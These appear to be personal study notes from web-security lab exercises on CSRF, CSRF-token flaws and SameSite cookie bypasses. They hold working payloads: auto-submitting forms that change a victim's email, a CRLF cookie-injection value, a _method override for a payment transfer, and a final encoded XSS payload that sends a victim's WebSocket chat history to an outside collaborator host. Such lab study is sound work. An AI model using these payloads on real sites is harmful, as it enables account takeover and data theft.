Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

->>if the attacker attack work on victim he might be able to gain privileges of the victims compromised account


possibilty of CSRF
->> relevant action for atatcker to induce
->>cookie based seesion handling
->>no unpredictable request params

if conditions are met attacker can script html page
`<html> <body> <form action="https://vulnerable-website.com/email/change" method="POST"> <input type="hidden" name="email" value="pwned@evil-user.net" /> </form> <script> document.forms[0].submit(); </script> </body> </html>`

->>^(assuming SameSite cookies are not being used)

->> steps to construction csrf
- Select a request anywhere in Burp Suite Professional that you want to test or exploit.
- From the right-click context menu, select Engagement tools / Generate CSRF PoC.
- Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
- You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
- Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.



# how to deliver a CSRF exploit 
->> mails for users to visit sights
->> if exploit is self contained no website needed v
`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`


# CSRF mitigations

->> CSRF tokens
->> Same-site cookies
->> referer based validation



# CSRF Token
->> a hidden combination of alpha numeric words server gives client when about to perform sensitive action like POST password etc.most times hiddenly given through html pages  not always doe (note!! make sure you check browser cake to find valid once )


# Flaws of CSRF Tokens
->> inconsistent validation with api calls GET,POST 
->> validation of tokens dependant on being present or not (skips if its absent)
->> CSRF Tokens are not tied to user sessions ..an attacker token can be used and validated on a victim(from browser cache ) 




CSRF tied to non session cookie
=
This situation is harder to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.



in changing cookie `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None`


after removing the sxript block

`<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">`


->> sometimes csrf is a duplicated cookies
=
->> recreate cookies setting behaviour and use it to perform csrf 

`POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com`


In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.



%0d = \r
%0a = \n


firt get a vuln way to set cookie most times for url 
 then write html poc scrtf code along java that triggers the abitrary java scritp like this pay load dont forget to add the SameSite header
 <d>--
 
<html>
<body>

<form action="https://0af5002703ff541a81f507e80007001f.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="greyattacker@gmail.com">
  <input type="hidden" name="csrf" value="Token">
</form>

<img src="https://0af5002703ff541a81f507e80007001f.web-security-academy.net/?search=werffg%0d%0aSet-Cookie:%20csrf=Token%3B%20SameSite=None"
onerror="document.forms[0].submit();">

</body>
</html>
</d>

Bypassing SameSite cookie restrictions
==

SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. 

 As you can see from this example, the term "site" is much less specific as it only accounts for the scheme and last part of the domain name. Crucially, this means that a cross-origin request can still be same-site, but not the other way around.
Request from 	Request to 	Same-site? 	Same-origin?
https://example.com 	https://example.com 	Yes 	Yes
https://app.example.com 	https://intranet.example.com 	Yes 	No: mismatched domain name
https://example.com 	https://example.com:8080 	Yes 	No: mismatched port
https://example.com 	https://example.co.uk 	No: mismatched eTLD 	No: mismatched domain name
https://example.com 	http://example.com 	No: mismatched scheme 	No: mismatched scheme 



 As these requests typically require a cookie associated with the victim's authenticated session, the attack will fail if the browser doesn't include this.

All major browsers currently support the following SameSite restriction levels:

    Strict
    Lax
    None


 Developers can manually configure a restriction level for each cookie they set, giving them more control over when these cookies are used. To do this, they just have to include the SameSite attribute in the Set-Cookie response header, along with their preferred value:
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict

note#
default for most web browsers is lax 



Strict
==
If a cookie is set with the SameSite=Strict attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.

This is recommended when setting cookies that enable the bearer to modify data or perform other sensitive actions, such as accessing specific pages that are only available to authenticated users.

Although this is the most secure option, it can negatively impact the user experience in cases where cross-site functionality is desirable.





lax
==
 Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:
 
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>

Other frameworks support a variety of similar parameters. 



client side redirects 
===

 If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.

One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on DOM-based open redirection. 

<script>
window.location="https://0aaf0074040962568009033500cd000c.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=attac%40gmail.com%26submit=1";
</script>



Bypassing SameSite restrictions via vulnerable sibling domains
==
first confirm if the target is vuln to csrf
get a sister domain that exploitable with xss
then chain the attack

**1. Identify WebSocket**

- Capture **WebSocket handshake** in **Burp → HTTP History**
    
- Request: `GET /chat`
    
- No CSRF token → **Potential CSWSH**
    

---

**2. Observe WebSocket Behavior**

- In **Burp → WebSockets history**
    
- Page load sends:
    

READY

- Server returns **entire chat history**
    

---

**3. CSWSH Proof of Concept**

- Open WebSocket from attacker page
    
- Send `READY`
    
- Exfiltrate messages to **Burp Collaborator**
    

Attack logic:

- `new WebSocket()` → connect
    
- `ws.send("READY")`
    
- `ws.onmessage` → send data to attacker server
    

---

**4. SameSite Protection**

- Session cookie set with:
    

SameSite=Strict

- Result:
    
    - Cookies **not included in cross-site requests**
        
    - WebSocket connection creates **new session**
        

---

**5. Find Additional Attack Surface**

- Proxy history reveals **sibling domain** via headers:
    

Access-Control-Allow-Origin

Example:

cms-LAB-ID.web-security-academy.net

---

**6. Discover XSS on Sibling Domain**

- Login page reflects **username**
    
- Payload works:
    

<script>alert(1)</script>

- **Reflected XSS confirmed**
    

---

**7. Convert Request to GET**

- In **Burp Repeater**
    
- Change `POST /login` → `GET`
    
- XSS now **triggerable via URL**
    

Example:

/login?username=<payload>&password=x

---

**8. Bypass SameSite**

- Execute CSWSH script via **XSS on sibling domain**
    
- Browser treats request as **same-site**
    
- Therefore:
    

SameSite=Strict cookies are sent

---

**9. Final Attack Chain**

Reflected XSS (cms subdomain)  
↓  
Same-site execution  
↓  
WebSocket connection to main domain  
↓  
Session cookie included  
↓  
Send READY  
↓  
Receive chat history  
↓  
Exfiltrate via Collaborator



exmaple of final payload that was used 

<script>

document.location="https://cms-0ad1004b0488443f80bb08aa0071004f.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%64%31%30%30%34%62%30%34%38%38%34%34%33%66%38%30%62%62%30%38%61%61%30%30%37%31%30%30%34%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%73%74%61%72%74%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%7d%0a%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%68%61%6e%64%6c%65%52%65%70%6c%79%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%6c%33%70%75%32%39%6d%71%68%67%75%34%64%6d%72%37%36%32%73%35%64%6f%6c%6c%6b%63%71%39%65%30%32%70%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%27%2b%65%76%65%6e%74%2e%64%61%74%61%2c%20%7b%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%7d%29%3b%0a%20%20%7d%0a%3c%2f%73%63%72%69%70%74%3e&password=2321320"

</script>